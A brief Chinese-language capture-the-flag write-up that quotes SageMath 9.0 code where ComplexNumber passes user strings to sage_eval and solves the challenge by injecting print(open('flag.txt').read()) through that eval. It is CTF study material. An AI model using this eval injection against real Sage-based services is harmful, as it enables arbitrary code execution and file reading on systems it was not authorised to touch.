## 考点

sage 9.0 bug

how2google

## 工具

docker, nc

## 步骤

关于 cc 的源码：https://github.com/sagemath/sage/commit/7dd78eff361f41195b54ec19fa139ddb5ff8d026

9.0 版本中，存在如下代码：

```python
# TODO: this is probably not the best and most
# efficient way to do this.  -- Martin Albrecht
return ComplexNumber(self,
            sage_eval(x.replace(' ',''), locals={"I":self.gen(),"i":self.gen()}))
```

直接利用函数内部的 eval 执行输出 flag 即可

```
print(open('flag.txt').read())
```

## 总结

google也行，去看sage源码也行
